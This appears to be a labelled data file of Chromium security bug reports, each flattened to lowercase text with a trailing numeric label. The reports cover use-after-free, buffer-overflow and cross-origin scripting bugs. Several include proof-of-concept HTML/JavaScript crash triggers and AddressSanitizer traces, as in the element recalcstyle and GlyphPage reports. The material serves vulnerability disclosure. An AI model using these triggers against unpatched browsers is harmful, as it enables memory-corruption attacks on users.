security swapped out url must be a unique origin vulnerability details web pages are able to script the contents of a swapped out renderview low impact version chrome version 13 through 19 operating system all reproduction case 1 visit a page that opens a new window and gets a reference to it e.g from window.open 2 navigate the new window to a cross-site page to trigger a process swap 3 the original page can control the blank contents of the swapped out renderview which is currently showing about swappedout when chrome does a cross-process navigation e.g for navigating between sites or to a webui page it keeps the renderview in the old renderer process around in case the user comes back because the tab is being rendered by another process we navigate the swapped out renderview to a blank page to prevent it from doing anything there are two requirements for this blank page it must commit synchronously to avoid races that have bitten us in the past and it must not be scriptable by other origins we re currently using about swappedout as the url which does commit synchronously but can unfortunately be scripted by an opener page there is currently little impact from this because it is n't much different from an attacker opening a window to about blank and scripting it it wo n't grant the attacker access to any other origins or internal state most actions taken in the swapped out renderview will never be visible to the user and the page will be replaced if the tab is navigated back to the process the one place i noticed a security impact was in webcore document shouldallownavigation i ve attached a repro case that shows it s possible to navigate a window you should n't be allowed to technically it does n't fully work yet but it will as soon as i land the fix for issue 116192 1 a.html opens a window named one to b1.html 2 a.html opens a second window named two to b2.html 3 a.html navigates window one to a url that triggers a process-swap e.g view-source 4 close the a.html tab 5 click a link in b2.html that targets window one here document shouldallownavigation should return false because window one is swapped out and does n't share an ancestor with window two instead it returns true because about swappedout has an about scheme and thus inherited the origin of its opener in document setsecurityorigin filing this as a security bug because it affects scripting pages that should be off limits and in case others find a way to cause more damage with it	11
unknown in skargb32_blitter blitv vulnerability details a renderer crash happens at an unknown address when the attached page is opened the address moves with aslr at least one of the arguments seems to affect it and there is a large numeric argument in one call suggesting an integer error version chrome version 17.0.963.83 stable 19.0.1083.0 dev operating system linux debian 6.0.4 x86_64 reproduction case google-chrome blit.html for crashes please include the following additional information type of crash tab crash state 28626 error addresssanitizer crashed on unknown address pc sp bp t0 addresssanitizer can not provide additional info aborting 0 in skargb32_blitter blitv int int int unsigned char 0 1 in vline int int int int skblitter int third_party/skia/src/core/skscan_antihair.cpp:0 2 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 3 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 4 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 5 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 6 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 7 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 8 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 9 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 10 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 11 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 12 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 13 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 14 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 15 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 16 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 17 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 18 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 19 in do_anti_hairline int int int int skirect const skblitter third_party/skia/src/core/skscan_antihair.cpp:0 20 in skscan antihairlinergn skpoint const skpoint const skregion const skblitter 0 21 in hairquad skpoint const skregion const skblitter int void skpoint const skpoint const skregion const skblitter third_party/skia/src/core/skscan_hairline.cpp:0 22 in hairquad skpoint const skregion const skblitter int void skpoint const skpoint const skregion const skblitter third_party/skia/src/core/skscan_hairline.cpp:0 23 in hairquad skpoint const skregion const skblitter int void skpoint const skpoint const skregion const skblitter third_party/skia/src/core/skscan_hairline.cpp:0 24 in hairquad skpoint const skregion const skblitter int void skpoint const skpoint const skregion const skblitter third_party/skia/src/core/skscan_hairline.cpp:0 25 in hairquad skpoint const skregion const skblitter int void skpoint const skpoint const skregion const skblitter third_party/skia/src/core/skscan_hairline.cpp:0 26 in hairquad skpoint const skregion const skblitter int void skpoint const skpoint const skregion const skblitter third_party/skia/src/core/skscan_hairline.cpp:0 27 in hair_path skpath const skrasterclip const skblitter void skpoint const skpoint const skregion const skblitter third_party/skia/src/core/skscan_hairline.cpp:0 28 in skdraw drawpath skpath const skpaint const skmatrix const bool const 0 29 in skcanvas drawpath skpath const skpaint const 0 30 in webcore graphicscontext strokepath webcore path const 0 31 in webcore canvasrenderingcontext2d stroke 0 32 in webcore canvasrenderingcontext2dinternal strokecallback v8 arguments const out/release/obj/gen/webkit/bindings/v8derivedsources17.cpp:0 33 in v8 internal builtin_handleapicall v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8 internal isolate v8/src/builtins.cc:0 34 35 36 37 38 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool v8/src/execution.cc:0 39 in v8 script run 0 40 in webcore v8proxy runscript v8 handle v8 script 0 41 in webcore v8proxy evaluate webcore scriptsourcecode const webcore node 0 42 in webcore scriptcontroller evaluate webcore scriptsourcecode const 0 43 in webcore scriptelement executescript webcore scriptsourcecode const 0 44 in webcore scriptelement preparescript wtf textposition const webcore scriptelement legacytypesupport 0 45 in webcore htmlscriptrunner runscript webcore element wtf textposition const 0 46 in webcore htmlscriptrunner execute wtf passrefptr webcore element wtf textposition const 0 47 in webcore htmldocumentparser runscriptsforpausedtreebuilder 0 48 in webcore htmldocumentparser cantakenexttoken webcore htmldocumentparser synchronousmode webcore pumpsession 0 49 in webcore htmldocumentparser pumptokenizer webcore htmldocumentparser synchronousmode 0 50 in webcore htmldocumentparser append webcore segmentedstring const 0 51 in webcore decodeddatadocumentparser flush webcore documentwriter 0 52 in webcore documentwriter endifnotloadingmainresource 0 53 in webcore frameloader finishedloading 0 54 in webcore mainresourceloader didfinishloading double 0 55 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 56 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 57 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const 0 58 in resourcedispatcher dispatchmessage ipc message const 0 59 in resourcedispatcher onmessagereceived ipc message const 0 60 in childthread onmessagereceived ipc message const 0 61 in ipc channelproxy context ondispatchmessage ipc message const 0 62 in messageloop runtask base pendingtask const 0 63 in messageloop deferorrunpendingtask base pendingtask const 0 stats 3m malloced 5m for red zones by 15209 calls stats 0m realloced by 44 calls stats 2m freed by 7323 calls stats 0m really freed by 0 calls stats 48m 12296 full pages mmaped in 12 calls mmaps by size class 8:16383 9:8191 10:4095 11:2047 12:1024 13:512 14:256 15:128 16:64 17:32 18:16 19:8 mallocs by size class 8:13793 9:653 10:398 11:203 12:38 13:41 14:57 15:8 16:9 17:5 18:2 19:2 frees by size class 8:6472 9:334 10:310 11:103 12:16 13:30 14:45 15:4 16:2 17:4 18:2 19:1 rfrees by size class stats malloc large 9 small slow 68	11
heap-use-after-free in webcore element recalcstyle vulnerability details use-after-free in webcore element recalcstyle version chrome version stable beta dev chromium 19.0.1085.0 developer build 129391 os linux webkit 536.5 112327 javascript v8 3.9.24.2 operating system 64bit linux reproduction case html head style el0 display inline-table el0 before display table-row-group el2 nth-child 0 el2 display table-column-group style script onload function el0=document.createelement q el0.setattribute id el0 document.body.appendchild el0 el1=document.createelement div el0.appendchild el1 el2=document.createelement div el2.setattribute id el2 el0.appendchild el2 document.designmode='on document.execcommand selectall document.execcommand formatblock false pre document.execcommand undo el0.insertbefore document.createelement td el1 document.execcommand formatblock false pre script head body body html for crashes please include the following additional information type of crash renderer+asan crash state 9112 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore element recalcstyle webcore node stylechange 0 1 in webcore element recalcstyle webcore node stylechange 0 is located 8 bytes inside of 104-byte region freed by thread t0 here 0 in free 0 1 in webcore renderobjectchildlist updatebeforeaftercontent webcore renderobject webcore pseudoid webcore renderobject const 0 2 in webcore renderblock styledidchange webcore styledifference webcore renderstyle const 0	11
heap-use-after-free in webcore workerthreadablewebsocketchannel bridge mainthreadcreatewebsocketchannel vulnerability details heap-use-after-free can be triggered while reloading document with working websockets version version 19.0.1079.0 128665 ubuntu 10.10 x64 reproduction case repro is in attachment flaky again it looks like a race condition not sure how to make it more stable first crash may occur at address for crashes please include the following additional information 6163 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/passrefptr.h:67 1 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/passrefptr.h:67 2 in webcore document didreceivetask void media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:4925 3 in base internal invokehelper false void base internal runnableadapter void void void void const makeitso base internal runnableadapter void void void const media/chromium/chromium/depot_tools/src/./base/bind_internal.h:869 4 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:459 5 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 6 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 7 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 8 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 9 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:301 10 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 11 in anonymous namespace runzygote content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:245 12 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:290 13 in anonymous namespace contentmainrunnerimpl run media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:511 14 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:35 15 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 16 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 17 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 is located 24 bytes inside of 48-byte region freed by thread t5 here 0 in free 0 1 in webcore websocket stop media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/modules/websockets/websocket.cpp:476 2 in webcore scriptexecutioncontext stopactivedomobjects media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/scriptexecutioncontext.cpp:222 3 in webcore workerthreadshutdownstarttask performtask webcore scriptexecutioncontext media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/workers/workerthread.cpp:226 4 in webcore workerrunloop runcleanuptasks webcore workercontext media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/workers/workerrunloop.cpp:191 5 in webcore workerrunloop run webcore workercontext media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/workers/workerrunloop.cpp:138 6 in webcore workerthread workerthread media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/workers/workerthread.cpp:161 7 in wtf threadentrypoint void media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/threading.cpp:70 8 in wtf wtfthreadentrypoint void media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/threadingpthreads.cpp:165 9 in asan asanthread threadstart 0 previously allocated by thread t5 here 0 in malloc 0 1 in wtf fastmalloc unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/fastmalloc.cpp:268 2 in webcore workerthreadablewebsocketchannel bridge create wtf passrefptr webcore threadablewebsocketchannelclientwrapper wtf passrefptr webcore workercontext wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/modules/websockets/workerthreadablewebsocketchannel.h:131 3 in webcore workerthreadablewebsocketchannel workerthreadablewebsocketchannel webcore workercontext webcore websocketchannelclient wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/modules/websockets/workerthreadablewebsocketchannel.cpp:57 4 in webcore workerthreadablewebsocketchannel create webcore workercontext webcore websocketchannelclient wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/modules/websockets/workerthreadablewebsocketchannel.h:59 5 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/refptr.h:58 6 in webcore websocket connect wtf string const wtf vector wtf string 0ul const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/modules/websockets/websocket.cpp:227 7 in webcore websocket connect wtf string const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/modules/websockets/websocket.cpp:179 8 in webcore v8websocket constructorcallback v8 arguments const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/custom/v8websocketcustom.cpp:85 9 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1115 10 11 12 13 14 15 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 16 in v8 script run media/chromium/chromium/depot_tools/src/v8/src/api.cc:1589 17 in webcore workercontextexecutionproxy runscript v8 handle v8 script media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/workercontextexecutionproxy.cpp:252 18 in webcore workercontextexecutionproxy evaluate wtf string const wtf string const wtf textposition const webcore workercontextexecutionstate media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/workercontextexecutionproxy.cpp:203 19 in webcore workerscriptcontroller evaluate webcore scriptsourcecode const webcore scriptvalue media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/workerscriptcontroller.cpp:85 20 in webcore workerthread workerthread media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/scriptsourcecode.h:44 thread t5 created by t0 here 0 in pthread_create 0 1 in wtf createthreadinternal void void void char const media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/threadingpthreads.cpp:210 2 in wtf createthread void void void char const media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/threading.cpp:86 3 in webcore workerthread start media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/workers/workerthread.cpp:122 4 in webkit webworkerclientimpl startworkercontext webcore kurl const wtf string const wtf string const webcore workerthreadstartmode media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/webworkerclientimpl.cpp:94 5 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/refptr.h:58 6 in webcore workerscriptloader didfinishloading unsigned long double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/workers/workerscriptloader.cpp:163 7 in webcore documentthreadableloader notifyfinished webcore cachedresource media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentthreadableloader.cpp:262 8 in webcore cachedresource checknotify media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/cache/cachedresource.cpp:247 9 in passrefptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/wtf/wtf/passrefptr.h:67 10 in webcore subresourceloader didfinishloading double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/subresourceloader.cpp:276 11 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/webkit/glue/weburlloader_impl.cc:655 12 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:489 13 in bool resourcemsg_requestcomplete dispatch resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const ipc message const resourcedispatcher resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/./content/common/resource_messages.h:169 14 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:559 15 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 16 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:172 17 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:268 18 in base internal invokehelper false void base internal runnableadapter void ipc channelproxy context ipc message const void ipc channelproxy context const ipc message const makeitso base internal runnableadapter void ipc channelproxy context ipc message const ipc channelproxy context const ipc message const media/chromium/chromium/depot_tools/src/./base/bind_internal.h:897 19 in messageloop runtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:459 20 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 21 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 22 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 23 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 24 in messageloop run media/chromium/chromium/depot_tools/src/base/message_loop.cc:301 25 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 26 in anonymous namespace runzygote content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:245 27 in anonymous namespace runnamedprocesstypemain std basic_string char std char_traits char std allocator char const content mainfunctionparams const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:290 28 in anonymous namespace contentmainrunnerimpl run media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:511 29 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:35 30 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 31 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 32 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 6163 aborting stats 48m malloced 40m for red zones by 109558 calls stats 2m realloced by 4080 calls stats 44m freed by 94857 calls stats 0m really freed by 0 calls stats 116m 29712 full pages mmaped in 29 calls mmaps by size class 8:98298 9:16382 10:12285 11:4094 12:1024 13:1536 14:256 15:256 16:64 17:64 18:16 19:8 20:4 21:6 mallocs by size class 8:82809 9:10663 10:11142 11:2496 12:547 13:1450 14:195 15:156 16:31 17:46 18:8 19:8 20:1 21:6 frees by size class 8:70237 9:9903 10:10403 11:2088 12:454 13:1363 14:180 15:150 16:24 17:32 18:8 19:8 20:1 21:6 rfrees by size class stats malloc large 69 small slow 534 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00	11
heap-use-after-free in webcore v8abstracteventlistener v8abstracteventlistener detailed report fuzzer inferno_layout_test_fuzzer crash type heap-use-after-free read 8 crash address crash state crash stack webcore v8abstracteventlistener v8abstracteventlistener webcore v8workercontexteventlistener v8workercontexteventlistener free stack v8 internal globalhandles globalhandles v8 internal globalhandles create regressed minimized testcase 1.73 kb	11
security stack-buffer-overflow in webcore glyphpage fill with surrogate characters this template is only for reporting security bugs please use a different template for other types of bug reports vulnerability details stack-buffer-overflow in webcore glyphpage fill with surrogate characters version chrome version stable dev chromium 20.0.1095.0 developer build 131299 os linux webkit 536.6 113522 operating system 64bit linux reproduction case html head style el0 webkit-writing-mode vertical-lr style script onload function el0=document.createelement div el0.setattribute id el0 document.body.appendchild el0 el0.appendchild document.createtextnode unescape ud801 udc00 script head body body html for crashes please include the following additional information type of crash renderer asan crash state 22621 error addresssanitizer stack-buffer-overflow on address at pc bp sp read of size 2 at thread t0 0 in webcore glyphpage fill unsigned int unsigned int unsigned short unsigned int webcore simplefontdata const 0 1 in webcore glyphpagetreenode initializepage webcore fontdata const unsigned int 0 address is located at offset 904 in frame webcore glyphpage fill unsigned int unsigned int unsigned short unsigned int webcore simplefontdata const of t0 s stack this frame has 5 object s 32 40 buffer.i 96 98 scriptindex.i 160 162 featureindex.i 224 328 paint 384 904 glyphstorage	9
global-buffer-overflow in hb_tibetanshape vulnerability details tibetan letter followed by tibetan cantillation sign heavy beat says global buffer overflow in asan version chrome version stable dev chromium 20.0.1095.0 developer build 131299 os linux webkit 536.6 113522 operating system linux 64bit reproduction case data text/html x0f40 x0fc0 for crashes please include the following additional information type of crash renderer asan crash state 29058 error addresssanitizer global-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in hb_tibetanshape 0 1 in hb_shapeitem 0 2 in webcore complextextcontroller shapeglyphs 0 is located 0 bytes to the right of global variable tibetanform third_party/harfbuzz/src/harfbuzz-tibetan.c of size 128 tibetanform third_party/harfbuzz/src/harfbuzz-tibetan.c is ascii string 0101010101010101010101010101010101010101010101010101010101010101010101010101010101010101	9
security error addresssanitizer heap-buffer-overflow on address at pc vulnerability details opening the ogv file and playing by pressing the play button crashes the browser tab version chrome version version 20.0.1100.0 131961 asan-symbolized-linux-release-131961 operating system xubuntu 11.00 reproduction case open the attached file in browser and press play button for crashes please include the following additional information type of crash tab browser etc crash state see link above stack trace registers exception record client id if relevant see link above stderr 15760:22236:133717149415 error ffmpeg_video_decoder.cc 355 error decoding a video frame with timestamp 266667 us duration 66667 us packet size 131 bytes 15760:7072:133860758269 error ffmpeg_video_decoder.cc 355 error decoding a video frame with timestamp 533000 us duration 66000 us packet size 19 bytes 15760 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 8 at thread t4403 0 in av_freep b/build/slave/asan_release__symbolized_/build/third_party/ffmpeg/libavutil/mem.c:181 1 in avformat_close_input b/build/slave/asan_release__symbolized_/build/third_party/ffmpeg/libavformat/utils.c:2750 is located 4 bytes to the right of 12-byte region allocated by thread t4403 here 0 in posix_memalign 0 1 in av_malloc b/build/slave/asan_release__symbolized_/build/third_party/ffmpeg/libavutil/mem.c:94 2 in av_mallocz b/build/slave/asan_release__symbolized_/build/third_party/ffmpeg/libavutil/mem.c:186 3 in ogg_packet b/build/slave/asan_release__symbolized_/build/third_party/ffmpeg/libavformat/oggdec.c:400 4 in ogg_get_headers b/build/slave/asan_release__symbolized_/build/third_party/ffmpeg/libavformat/oggdec.c:467 5 in media ffmpegdemuxer initializetask media demuxerhost base callback void media pipelinestatus const b/build/slave/asan_release__symbolized_/build/media/filters/ffmpeg_demuxer.cc:483 6 in base internal invokehelper false void base internal runnableadapter void media ffmpegdemuxer media demuxerhost base callback void media pipelinestatus const void media ffmpegdemuxer const media demuxerhost const base callback void media pipelinestatus const makeitso base internal runnableadapter void media ffmpegdemuxer media demuxerhost base callback void media pipelinestatus const media ffmpegdemuxer const media demuxerhost const base callback void media pipelinestatus const b/build/slave/asan_release__symbolized_/build/./base/bind_internal.h:927 7 in messageloop runtask base pendingtask const b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:459 8 in messageloop deferorrunpendingtask base pendingtask const b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:470 9 in messageloop dowork b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:647 10 in base messagepumpdefault run base messagepump delegate b/build/slave/asan_release__symbolized_/build/base/message_pump_default.cc:28 11 in messageloop runinternal b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:418 12 in messageloop run b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:301 13 in base thread threadmain b/build/slave/asan_release__symbolized_/build/base/threading/thread.cc:164 14 in threadfunc b/build/slave/asan_release__symbolized_/build/base/threading/platform_thread_posix.cc:65 15 in asan asanthread threadstart 0 thread t4403 created by t0 here 0 in pthread_create 0 1 in createthread b/build/slave/asan_release__symbolized_/build/base/threading/platform_thread_posix.cc:127 2 in base platformthread create unsigned long base platformthread delegate unsigned long b/build/slave/asan_release__symbolized_/build/base/threading/platform_thread_posix.cc:249 3 in base thread startwithoptions base thread options const b/build/slave/asan_release__symbolized_/build/base/threading/thread.cc:72 4 in base thread start b/build/slave/asan_release__symbolized_/build/base/threading/thread.cc:61 5 in media messageloopfactory getthread std basic_string char std char_traits char std allocator char const b/build/slave/asan_release__symbolized_/build/media/base/message_loop_factory.cc:42 6 in media messageloopfactory getmessageloop std basic_string char std char_traits char std allocator char const b/build/slave/asan_release__symbolized_/build/media/base/message_loop_factory.cc:24 7 in webmediaplayerimpl b/build/slave/asan_release__symbolized_/build/webkit/media/webmediaplayer_impl.cc:130 8 in renderviewimpl createmediaplayer webkit webframe webkit webmediaplayerclient b/build/slave/asan_release__symbolized_/build/content/renderer/render_view_impl.cc:2220 9 in createwebmediaplayer b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webkit/chromium/src/webmediaplayerclientimpl.cpp:58 10 in webkit webmediaplayerclientimpl loadinternal b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webkit/chromium/src/webmediaplayerclientimpl.cpp:250 11 in webkit webmediaplayerclientimpl load wtf string const b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webkit/chromium/src/webmediaplayerclientimpl.cpp:240 12 in webcore mediaplayer loadwithnextmediaengine webcore mediaplayerfactory b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/platform/graphics/mediaplayer.cpp:408 13 in webcore mediaplayer load webcore kurl const webcore contenttype const b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/platform/graphics/mediaplayer.cpp:366 14 in webcore htmlmediaelement loadresource webcore kurl const webcore contenttype b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/html/htmlmediaelement.cpp:964 15 in webcore htmlmediaelement loadnextsourcechild b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/html/htmlmediaelement.cpp:865 16 in webcore htmlmediaelement selectmediaresource b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/html/htmlmediaelement.cpp:846 17 in webcore htmlmediaelement loadinternal b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/html/htmlmediaelement.cpp:775 18 in webcore htmlmediaelement loadtimerfired webcore timer webcore htmlmediaelement b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/html/htmlmediaelement.cpp:587 19 in webcore threadtimers sharedtimerfiredinternal b/build/slave/asan_release__symbolized_/build/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 20 in base internal invokehelper false void base internal runnableadapter void webkit_glue webkitplatformsupportimpl void webkit_glue webkitplatformsupportimpl makeitso base internal runnableadapter void webkit_glue webkitplatformsupportimpl webkit_glue webkitplatformsupportimpl b/build/slave/asan_release__symbolized_/build/./base/bind_internal.h:869 21 in base internal invoker 1 base internal bindstate base internal runnableadapter void webkit_glue webkitplatformsupportimpl void webkit_glue webkitplatformsupportimpl void base internal unretainedwrapper webkit_glue webkitplatformsupportimpl void webkit_glue webkitplatformsupportimpl run base internal bindstatebase b/build/slave/asan_release__symbolized_/build/./base/bind_internal.h:1170 22 in base timer runscheduledtask b/build/slave/asan_release__symbolized_/build/base/timer.cc:182 23 in base internal invokehelper false void base internal runnableadapter void base basetimertaskinternal void base basetimertaskinternal makeitso base internal runnableadapter void base basetimertaskinternal base basetimertaskinternal b/build/slave/asan_release__symbolized_/build/./base/bind_internal.h:869 24 in base internal invoker 1 base internal bindstate base internal runnableadapter void base basetimertaskinternal void base basetimertaskinternal void base internal ownedwrapper base basetimertaskinternal void base basetimertaskinternal run base internal bindstatebase b/build/slave/asan_release__symbolized_/build/./base/bind_internal.h:1170 25 in messageloop runtask base pendingtask const b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:459 26 in messageloop deferorrunpendingtask base pendingtask const b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:470 27 in messageloop dowork b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:647 28 in base messagepumpdefault run base messagepump delegate b/build/slave/asan_release__symbolized_/build/base/message_pump_default.cc:28 29 in messageloop runinternal b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:418 30 in messageloop run b/build/slave/asan_release__symbolized_/build/base/message_loop.cc:301 31 in renderermain content mainfunctionparams const b/build/slave/asan_release__symbolized_/build/content/renderer/renderer_main.cc:281 32 in runzygote b/build/slave/asan_release__symbolized_/build/content/app/content_main_runner.cc:246 33 in runnamedprocesstypemain b/build/slave/asan_release__symbolized_/build/content/app/content_main_runner.cc:291 34 in anonymous namespace contentmainrunnerimpl run b/build/slave/asan_release__symbolized_/build/content/app/content_main_runner.cc:520 35 in content contentmain int char const content contentmaindelegate b/build/slave/asan_release__symbolized_/build/content/app/content_main.cc:35 36 in chromemain b/build/slave/asan_release__symbolized_/build/chrome/app/chrome_main.cc:32 